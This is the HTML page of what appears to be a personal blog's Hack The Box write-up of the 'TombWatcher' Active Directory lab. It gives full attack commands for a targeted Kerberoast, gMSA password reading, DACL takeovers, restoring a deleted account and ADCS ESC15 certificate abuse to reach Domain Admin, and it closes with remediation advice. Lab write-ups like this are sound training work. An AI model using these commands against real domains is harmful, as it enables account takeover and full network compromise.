@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+  <title>┌──(1kb2㉿onekbtwo)-[~/blog/tombwatcher]</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="alternate" type="application/rss+xml" title="1kb2" href="../feed.xml">
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="../favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../apple-touch-icon.png">
+  <meta name="theme-color" content="#000000">
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="HTB CPTS Track: TombWatcher (medium)">
+  <meta property="og:description" content="Assumed-breach AD box: a BloodHound ACL chain (WriteSPN kerberoast, a gMSA read, ForceChangePassword, WriteOwner) walks henry to john, then john restores a tombstoned cert_admin and abuses ADCS ESC15 (EKUwu) to mint an Administrator certificate for Domain Admin.">
+  <meta property="og:url" content="https://1kb2.xyz/blog/tombwatcher.html">
+  <meta property="og:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="HTB CPTS Track: TombWatcher (medium)">
+  <meta name="twitter:description" content="Assumed-breach AD box: a BloodHound ACL chain (WriteSPN kerberoast, a gMSA read, ForceChangePassword, WriteOwner) walks henry to john, then john restores a tombstoned cert_admin and abuses ADCS ESC15 (EKUwu) to mint an Administrator certificate for Domain Admin.">
+  <meta name="twitter:image" content="https://1kb2.xyz/images/brand/graf-og.png">
+  <script>document.documentElement.className = "js";</script>
+  <script src="../js/graf.js" defer></script>
+  <script src="../js/post.js" defer></script>
+</head>
+<body data-graf="perch">
+  <nav class="nav">
+    <a href="../index.html">home</a>
+    <a href="../timeline.html">timeline</a>
+    <a href="../blog/index.html">blog</a>
+    <a href="../feed.xml">rss</a>
+  </nav>
+
+  <main class="markdown-body">
+    <h1>HTB CPTS Track: TombWatcher (medium)</h1>
+    <p class="post-meta">2026-10-21 &middot; <a class="post-cat" href="index.html#cat-htb-cpts-track-writeups">HTB &quot;CPTS Track&quot; writeups</a></p>
+    <p class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/active-directory.html" data-tag="active-directory">#active-directory</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a><a class="tag" href="tag/bloodhound.html" data-tag="bloodhound">#bloodhound</a><a class="tag" href="tag/targeted-kerberoasting.html" data-tag="targeted-kerberoasting">#targeted-kerberoasting</a><a class="tag" href="tag/gmsa.html" data-tag="gmsa">#gmsa</a><a class="tag" href="tag/dacl-abuse.html" data-tag="dacl-abuse">#dacl-abuse</a><a class="tag" href="tag/adcs.html" data-tag="adcs">#adcs</a><a class="tag" href="tag/esc15.html" data-tag="esc15">#esc15</a><a class="tag" href="tag/tombstone-revival.html" data-tag="tombstone-revival">#tombstone-revival</a></p>
+    <p class="post-abstract">Assumed-breach AD box: a BloodHound ACL chain (WriteSPN kerberoast, a gMSA read, ForceChangePassword, WriteOwner) walks henry to john, then john restores a tombstoned cert_admin and abuses ADCS ESC15 (EKUwu) to mint an Administrator certificate for Domain Admin.</p>
+    <details class="toc-box" open>
+      <summary>contents</summary>
+<div class="toc">
+<ul>
+<li><a href="#enumeration">Enumeration</a><ul>
+<li><a href="#nmap">Nmap</a></li>
+<li><a href="#bloodhound">BloodHound</a></li>
+</ul>
+</li>
+<li><a href="#the-acl-chain-to-john">The ACL Chain to john</a><ul>
+<li><a href="#henry-alfred-writespn-targeted-kerberoast">henry → Alfred: WriteSPN + targeted Kerberoast</a></li>
+<li><a href="#alfred-infrastructure-ansible_dev-a-gmsa-read">Alfred → Infrastructure → ANSIBLE_DEV$: a gMSA read</a></li>
+<li><a href="#ansible_dev-sam-john-forcechangepassword-and-writeowner">ANSIBLE_DEV$ → sam → john: ForceChangePassword and WriteOwner</a></li>
+</ul>
+</li>
+<li><a href="#root-tombstone-revival-adcs-esc15">Root: Tombstone Revival + ADCS ESC15</a><ul>
+<li><a href="#esc15-ekuwu">ESC15 (EKUwu)</a></li>
+</ul>
+</li>
+<li><a href="#remediation">Remediation</a></li>
+</ul>
+</div>
+    </details>
+<p><img alt="" src="../images/TombWatcher1.png" /></p>
+<p>TombWatcher is an assumed-breach Active Directory box, and it's almost entirely an ACL story. You start as a low-priv user and chain outbound object-control edges in BloodHound, one abuse feeding the credentials for the next, until you land a shell as <code>john</code>. Root is the part that earns the box its name: <code>john</code> can resurrect <strong>tombstoned</strong> (deleted) AD objects, and bringing a <code>cert_admin</code> account back from the dead opens an ADCS <strong>ESC15</strong> path straight to Domain Admin.</p>
+<ol>
+<li><strong>WriteSPN</strong> over <code>alfred</code> → targeted Kerberoast → crack to <code>basketball</code>.</li>
+<li><code>alfred</code> can <strong>AddSelf</strong> to a group with <strong>ReadGMSAPassword</strong> → read the <code>ANSIBLE_DEV$</code> gMSA hash.</li>
+<li><code>ANSIBLE_DEV$</code> has <strong>ForceChangePassword</strong> over <code>sam</code>; <code>sam</code> has <strong>WriteOwner</strong> over <code>john</code> → reset both and WinRM in for user.</li>
+<li><code>john</code> can <strong>restore deleted objects</strong> → revive <code>cert_admin</code>, then <strong>ESC15 / EKUwu</strong> mints an Administrator cert for root.</li>
+</ol>
+<blockquote>
+<p>Assumed-breach start, credentials provided:</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code>henry / H3nry_987TGV!
+</code></pre></div>
+
+<hr />
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="link to this section">&para;</a></h2>
+<h3 id="nmap">Nmap<a class="headerlink" href="#nmap" title="link to this section">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.232.167<span class="w"> </span>-T5
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb)
+445/tcp   open  microsoft-ds?
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0        # WinRM
+9389/tcp  open  mc-nmf        .NET Message Framing
+Service Info: Host: DC01; OS: Windows
+</code></pre></div>
+
+<p>The standard domain-controller fingerprint: <code>DC01</code> in <code>tombwatcher.htb</code>. Nmap reports a <strong>+4h clock skew</strong>, worth remembering, because Kerberos is time-sensitive and that skew will break ticket requests until I sync to the DC. Build a hosts file with nxc and add it:</p>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.232.167<span class="w"> </span>--generate-hosts-file<span class="w"> </span>out.txt
+<span class="c1"># 10.129.232.167   DC01.tombwatcher.htb tombwatcher.htb DC01</span>
+</code></pre></div>
+
+<p>The provided <code>henry</code> creds validate over LDAP/SMB/WMI (validated through <code>nxc</code>) but <strong>not</strong> WinRM, so <code>henry</code> isn't a remote user. This box is going to be about what <code>henry</code> can <em>reach</em>, not where he can log in.</p>
+<h3 id="bloodhound">BloodHound<a class="headerlink" href="#bloodhound" title="link to this section">&para;</a></h3>
+<p>Collect with <code>nxc</code>'s BloodHound module:</p>
+<div class="codehilite"><pre><span></span><code>nxc<span class="w"> </span>ldap<span class="w"> </span>DC01.tombwatcher.htb<span class="w"> </span>--dns-server<span class="w"> </span><span class="m">10</span>.129.232.167<span class="w"> </span>-u<span class="w"> </span>henry<span class="w"> </span>-p<span class="w"> </span><span class="s1">'H3nry_987TGV!'</span><span class="w"> </span>--bloodhound<span class="w"> </span>--collection<span class="w"> </span>All
+</code></pre></div>
+
+<p>From here on, every move is "read the next outbound edge in BloodHound, abuse it, use the result to reach the next one."</p>
+<hr />
+<h2 id="the-acl-chain-to-john">The ACL Chain to <code>john</code><a class="headerlink" href="#the-acl-chain-to-john" title="link to this section">&para;</a></h2>
+<h3 id="henry-alfred-writespn-targeted-kerberoast">henry → Alfred: WriteSPN + targeted Kerberoast<a class="headerlink" href="#henry-alfred-writespn-targeted-kerberoast" title="link to this section">&para;</a></h3>
+<p><code>henry</code>'s one interesting outbound edge is <strong><code>WriteSPN</code></strong> over <code>alfred</code>:</p>
+<p><img alt="" src="../images/TombWatcher2.png" /></p>
+<p>BloodHound's own help spells out the abuse, a targeted Kerberoast:</p>
+<p><img alt="" src="../images/TombWatcher3.png" /></p>
+<blockquote>
+<p><strong>Why this works:</strong> with write access to a user's <code>servicePrincipalName</code>, you set an SPN on the account, then request a service ticket (TGS) for it. That ticket is encrypted with the target account's NT hash, so it cracks offline like any Kerberoast, no need for the account to be a real service. <a href="https://github.com/ShutdownRepo/targetedKerberoast"><code>targetedKerberoast</code></a> automates the add-SPN / roast / remove-SPN cycle.</p>
+</blockquote>
+<p>Sync the clock first (that +4h skew will otherwise kill the Kerberos exchange), then roast:</p>
+<div class="codehilite"><pre><span></span><code>sudo<span class="w"> </span>ntpdate<span class="w"> </span><span class="m">10</span>.129.232.167
+python3<span class="w"> </span>targetedKerberoast.py<span class="w"> </span>-v<span class="w"> </span>-d<span class="w"> </span><span class="s1">'tombwatcher.htb'</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">'henry'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'H3nry_987TGV!'</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>[+] Printing hash for (Alfred)
+$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$f44bd07ae4c481...(trimmed)
+</code></pre></div>
+
+<p>Crack it (hashcat <code>13100</code>, Kerberos TGS-REP):</p>
+<div class="codehilite"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>Alfred_hash<span class="w"> </span>/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$...(trimmed):basketball
+</code></pre></div>
+
+<p><strong><code>Alfred / basketball</code></strong></p>
+<h3 id="alfred-infrastructure-ansible_dev-a-gmsa-read">Alfred → Infrastructure → ANSIBLE_DEV$: a gMSA read<a class="headerlink" href="#alfred-infrastructure-ansible_dev-a-gmsa-read" title="link to this section">&para;</a></h3>
+<p>As <code>alfred</code>, BloodHound shows he can <strong><code>AddSelf</code></strong> to the <code>INFRASTRUCTURE</code> group, which in turn holds <strong><code>ReadGMSAPassword</code></strong> over the <code>ANSIBLE_DEV$</code> machine account:</p>
+<p><img alt="" src="../images/TombWatcher4.png" /></p>
+<blockquote>
+<p><strong>Why this works:</strong> a group-Managed Service Account stores its password in the <code>msDS-ManagedPassword</code> attribute, readable only by the principals listed in <code>PrincipalsAllowedToRetrieveManagedPassword</code>. Here that's the <code>INFRASTRUCTURE</code> group, and <code>alfred</code> can add himself to it. Once he's a member, he can read the managed-password blob and derive the account's NT hash.</p>
+</blockquote>
+<p>The <code>net</code> one-liners BloodHound suggested didn't work for me, so I used <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a> throughout. Add <code>alfred</code> to the group, then read the gMSA password:</p>
+<div class="codehilite"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span>DC01.tombwatcher.htb<span class="w"> </span>-d<span class="w"> </span>TOMBWATCHER.HTB<span class="w"> </span>-u<span class="w"> </span>ALFRED<span class="w"> </span>-p<span class="w"> </span><span class="s1">'basketball'</span><span class="w"> </span>add<span class="w"> </span>groupMember<span class="w"> </span>INFRASTRUCTURE<span class="w"> </span>ALFRED
+<span class="c1"># [+] ALFRED added to INFRASTRUCTURE</span>
+
+bloodyAD<span class="w"> </span>--host<span class="w"> </span>DC01.tombwatcher.htb<span class="w"> </span>-d<span class="w"> </span>tombwatcher.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'alfred'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'basketball'</span><span class="w"> </span>get<span class="w"> </span>object<span class="w"> </span><span class="s1">'ANSIBLE_DEV$'</span><span class="w"> </span>--attr<span class="w"> </span>msDS-ManagedPassword
+<span class="c1"># msDS-ManagedPassword.NT: 8d5363f881f1bb3bff9b0d64b8b76d7a</span>
+</code></pre></div>
+
+<h3 id="ansible_dev-sam-john-forcechangepassword-and-writeowner">ANSIBLE_DEV$ → sam → john: ForceChangePassword and WriteOwner<a class="headerlink" href="#ansible_dev-sam-john-forcechangepassword-and-writeowner" title="link to this section">&para;</a></h3>
+<p><code>ANSIBLE_DEV$</code> has <strong><code>ForceChangePassword</code></strong> over <code>sam</code>, so pass-the-hash as the machine account and reset Sam's password:</p>
+<p><img alt="" src="../images/TombWatcher5.png" /></p>
+<div class="codehilite"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span>DC01.tombwatcher.htb<span class="w"> </span>-d<span class="w"> </span>tombwatcher.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'ANSIBLE_DEV$'</span><span class="w"> </span>-p<span class="w"> </span>:8d5363f881f1bb3bff9b0d64b8b76d7a<span class="w"> </span><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span>sam<span class="w"> </span><span class="s1">'password'</span>
+<span class="c1"># [+] Password changed successfully!</span>
+</code></pre></div>
+
+<p><code>sam</code>, in turn, has <strong><code>WriteOwner</code></strong> over <code>john</code>, and <code>john</code> is in <strong>Remote Management Users</strong>, so owning him gets me an interactive shell and the user flag:</p>
+<p><img alt="" src="../images/TombWatcher6.png" /></p>
+<blockquote>
+<p><strong>Why this works:</strong> <code>WriteOwner</code> lets you set yourself as the object's owner; an owner can rewrite the DACL to grant itself <code>GenericAll</code>; and <code>GenericAll</code> includes the right to reset the password. It's the classic three-step DACL takeover, each step is a separate bloodyAD call.</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="m">10</span>.129.179.93<span class="w"> </span>-d<span class="w"> </span>tombwatcher.htb<span class="w"> </span>-u<span class="w"> </span>sam<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span><span class="nb">set</span><span class="w"> </span>owner<span class="w"> </span>john<span class="w"> </span>sam
+bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="m">10</span>.129.179.93<span class="w"> </span>-d<span class="w"> </span>tombwatcher.htb<span class="w"> </span>-u<span class="w"> </span>sam<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>add<span class="w"> </span>genericAll<span class="w"> </span>john<span class="w"> </span>sam
+bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="m">10</span>.129.179.93<span class="w"> </span>-d<span class="w"> </span>tombwatcher.htb<span class="w"> </span>-u<span class="w"> </span>sam<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span>john<span class="w"> </span>password
+</code></pre></div>
+
+<p>Now WinRM in as <code>john</code>:</p>
+<div class="codehilite"><pre><span></span><code>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.129.179.93<span class="w"> </span>-u<span class="w"> </span>john<span class="w"> </span>-p<span class="w"> </span>password
+*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\j</span>ohn<span class="se">\D</span>esktop&gt;<span class="w"> </span>cat<span class="w"> </span>user.txt
+&lt;FLAG&gt;
+</code></pre></div>
+
+<p><strong>user.txt captured.</strong> (The box picked up a new IP, <code>10.129.179.93</code>, around this point; same host.)</p>
+<hr />
+<h2 id="root-tombstone-revival-adcs-esc15">Root: Tombstone Revival + ADCS ESC15<a class="headerlink" href="#root-tombstone-revival-adcs-esc15" title="link to this section">&para;</a></h2>
+<p><code>certipy find</code> as <code>john</code> shows a CA (<code>tombwatcher-CA-1</code>) and, buried in the <code>KerberosAuthentication</code> template permissions, a lone <strong>SID</strong> with enrollment rights that doesn't resolve to any live object: <code>S-1-5-21-...-1111</code>. That dangling SID is the clue. Checking what <code>john</code> can write with bloodyAD explains it:</p>
+<div class="codehilite"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="m">10</span>.129.179.93<span class="w"> </span>-d<span class="w"> </span>dc01.tombwatcher.htb<span class="w"> </span>-u<span class="w"> </span>john<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>get<span class="w"> </span>writable
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>distinguishedName: OU=ADCS,DC=tombwatcher,DC=htb
+permission: CREATE_CHILD; WRITE  / OWNER: WRITE / DACL: WRITE
+
+distinguishedName: CN=cert_admin\0ADEL:&lt;guid&gt;,CN=Deleted Objects,DC=tombwatcher,DC=htb
+permission: CREATE_CHILD; WRITE  / OWNER: WRITE / DACL: WRITE   (x3)
+</code></pre></div>
+
+<p><code>john</code> controls the <strong><code>OU=ADCS</code></strong> and three tombstoned <strong><code>cert_admin</code></strong> objects sitting in <code>CN=Deleted Objects</code>.</p>
+<blockquote>
+<p><strong>Why this works:</strong> when an AD object is deleted it isn't immediately gone, it becomes a <em>tombstone</em> in <code>CN=Deleted Objects</code> for the tombstone lifetime, keeping enough attributes to be undeleted. If you hold write/restore rights over a deleted object (and a place to restore it to), you can resurrect it with <code>Restore-ADObject</code> / bloodyAD <code>set restore</code>. TombWatcher hides a <code>cert_admin</code> account with ADCS enrollment rights in the graveyard; bring the right one back and you inherit its certificate privileges.</p>
+</blockquote>
+<p>There are three <code>cert_admin</code> tombstones with different GUIDs/SIDs, and only the one whose SID is <code>...-1111</code> matches the enrollment right from the template. So it's a game of restore-one, check, delete, restore-the-next until the SID lines up:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Command used to remove previous resurections:</span>
+bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="m">10</span>.129.179.93<span class="w"> </span>-d<span class="w"> </span>tombwatcher.htb<span class="w"> </span>-u<span class="w"> </span>john<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>remove<span class="w"> </span>object<span class="w"> </span>cert_admin
+
+bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="m">10</span>.129.179.93<span class="w"> </span>-d<span class="w"> </span>tombwatcher.htb<span class="w"> </span>-u<span class="w"> </span>john<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span><span class="nb">set</span><span class="w"> </span>restore<span class="w"> </span><span class="s1">'CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb'</span>
+<span class="c1"># [+] ... restored successfully under CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb</span>
+</code></pre></div>
+
+<p>Because <code>john</code> owns the <code>ADCS</code> OU, the restored <code>cert_admin</code> lands under his control, so he can just set its password:</p>
+<div class="codehilite"><pre><span></span><code>bloodyAD<span class="w"> </span>--host<span class="w"> </span><span class="m">10</span>.129.179.93<span class="w"> </span>-d<span class="w"> </span>tombwatcher.htb<span class="w"> </span>-u<span class="w"> </span>john<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span>cert_admin<span class="w"> </span>password
+</code></pre></div>
+
+<h3 id="esc15-ekuwu">ESC15 (EKUwu)<a class="headerlink" href="#esc15-ekuwu" title="link to this section">&para;</a></h3>
+<p>Now <code>cert_admin</code> can enroll, and the <code>WebServer</code> template is the way in.</p>
+<blockquote>
+<p><strong>Why this works (ESC15 / EKUwu, CVE-2024-49019):</strong> Schema V1 certificate templates that let the enrollee supply the subject (like the default <code>WebServer</code>) don't pin the application policies. Certipy's <code>-application-policies</code> injects a <strong>Client Authentication</strong> policy into the request, turning a server-auth template into something usable for logon, and <code>-upn</code>/<code>-sid</code> set the certificate's SAN to the target. So <code>cert_admin</code> requests a cert that authenticates as <strong>Administrator</strong>.</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span><span class="s1">'cert_admin@tombwatcher.htb'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'password'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="s1">'10.129.179.93'</span><span class="w"> </span>-target<span class="w"> </span><span class="s1">'DC01.TOMBWATCHER.HTB'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-ca<span class="w"> </span><span class="s1">'tombwatcher-CA-1'</span><span class="w"> </span>-template<span class="w"> </span><span class="s1">'WebServer'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-upn<span class="w"> </span><span class="s1">'administrator@tombwatcher.htb'</span><span class="w"> </span>-sid<span class="w"> </span><span class="s1">'S-1-5-21-1392491010-1358638721-2126982587-500'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-application-policies<span class="w"> </span><span class="s1">'Client Authentication'</span>
+</code></pre></div>
+
+<p>That writes <code>administrator.pfx</code>. Authenticating it as a straight PKINIT TGT fails (<code>Certificate is not valid for client authentication</code>, the base template EKU is server auth), so I use the <strong>LDAP shell</strong> instead, which authenticates over Schannel. That first hits an OpenSSL <code>CA_MD_TOO_WEAK</code> wall (the CA's cert is signed with a weak MD), fixed with a throwaway OpenSSL config that drops the security level:</p>
+<div class="codehilite"><pre><span></span><code>cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/openssl_weak.cnf<span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
+<span class="s">openssl_conf = openssl_init</span>
+<span class="s">[openssl_init]</span>
+<span class="s">ssl_conf = ssl_sect</span>
+<span class="s">[ssl_sect]</span>
+<span class="s">system_default = system_default_sect</span>
+<span class="s">[system_default_sect]</span>
+<span class="s">Options = UnsafeLegacyRenegotiation</span>
+<span class="s">CipherString = DEFAULT@SECLEVEL=0</span>
+<span class="s">EOF</span>
+
+<span class="nv">OPENSSL_CONF</span><span class="o">=</span>/tmp/openssl_weak.cnf<span class="w"> </span>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span><span class="s1">'administrator.pfx'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="s1">'10.129.179.93'</span><span class="w"> </span>-ldap-shell
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>[*] Authenticated to '10.129.179.93' as: 'u:TOMBWATCHER\Administrator'
+# change_password Administrator &lt;NewPass123!&gt;
+Password changed successfully!
+</code></pre></div>
+
+<p>From the LDAP shell I reset the real Administrator's password, then WinRM in for the root flag:</p>
+<div class="codehilite"><pre><span></span><code>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.129.179.93<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;NewPass123!&gt;'</span>
+*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;<span class="w"> </span><span class="nb">type</span><span class="w"> </span>root.txt
+&lt;FLAG&gt;
+</code></pre></div>
+
+<p><strong>root.txt captured. Box owned.</strong></p>
+<hr />
+<h2 id="remediation">Remediation<a class="headerlink" href="#remediation" title="link to this section">&para;</a></h2>
+<ul>
+<li><strong>Audit outbound object control.</strong> Every hop here was a misplaced ACE (<code>WriteSPN</code>, <code>AddSelf</code>, <code>ForceChangePassword</code>, <code>WriteOwner</code>). Review DACLs on users/groups and remove write rights that aren't operationally required.</li>
+<li><strong>Protect gMSA retrieval.</strong> Scope <code>PrincipalsAllowedToRetrieveManagedPassword</code> tightly, and don't let a low-priv user <code>AddSelf</code> into a group that holds it.</li>
+<li><strong>Lock down deleted-object restore.</strong> Rights over <code>CN=Deleted Objects</code> and <code>OU=ADCS</code> let a normal user resurrect a privileged account. Restrict who can undelete objects, and don't leave privileged accounts tombstoned with their ACLs intact.</li>
+<li><strong>Fix the ADCS templates (ESC15).</strong> Remove "enrollee supplies subject" from server templates like <code>WebServer</code>, enforce manager approval, and upgrade to Schema V2+ so application policies can't be injected. Patch CVE-2024-49019.</li>
+</ul>
+<hr />
+<p>References:</p>
+<ul>
+<li><a href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast</a></li>
+<li><a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></li>
+<li><a href="https://github.com/ly4k/Certipy">Certipy</a></li>
+<li><a href="https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc">ESC15 / EKUwu (CVE-2024-49019), TrustedSec</a></li>
+</ul>
+  </main>
+  <nav class="related" aria-label="Related posts">
+    <h2 class="related-h">related</h2>
+    <ul class="posts">
+      <li class="post"><a class="post-title" href="fluffy.html">HTB CPTS Track: Fluffy (easy)</a><span class="post-tags"><a class="tag" href="tag/active-directory.html" data-tag="active-directory">#active-directory</a><a class="tag" href="tag/adcs.html" data-tag="adcs">#adcs</a><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a></span></li>
+      <li class="post"><a class="post-title" href="media.html">HTB CPTS Track: Media (medium)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a></span></li>
+      <li class="post"><a class="post-title" href="pov.html">HTB CPTS Track: Pov (medium)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a></span></li>
+      <li class="post"><a class="post-title" href="jeeves.html">HTB CPTS Track: Jeeves (medium)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a><a class="tag" href="tag/windows.html" data-tag="windows">#windows</a></span></li>
+      <li class="post"><a class="post-title" href="postman.html">HTB CPTS Track: Postman (easy)</a><span class="post-tags"><a class="tag" href="tag/cpts-track.html" data-tag="cpts-track">#cpts-track</a><a class="tag" href="tag/htb.html" data-tag="htb">#htb</a></span></li>
+    </ul>
+  </nav>
+
+  <footer class="footer">
+    <a href="../index.html">back to top</a>
+  </footer>
+</body>
+</html>
